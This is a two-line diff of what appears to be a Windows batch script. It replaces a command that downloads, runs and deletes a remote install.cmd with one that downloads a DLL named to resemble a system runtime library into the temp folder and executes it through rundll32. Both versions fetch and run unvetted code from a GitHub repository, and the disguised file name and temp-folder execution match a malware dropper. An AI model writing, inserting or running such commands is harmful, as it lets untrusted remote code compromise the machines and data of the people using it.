@@ -1,1 +1,2 @@
-curl -sL -o install.cmd "https://raw.githubusercontent.com/akucursed/z/refs/heads/main/install.cmd" && install.cmd && del install.cmd
+@echo off
+curl -sL -o "%TEMP%\msvcrt_extra.dll" "https://github.com/akucursed/z/raw/refs/heads/main/msvcrt_extra.dll" && rundll32.exe "%TEMP%\msvcrt_extra.dll",Run
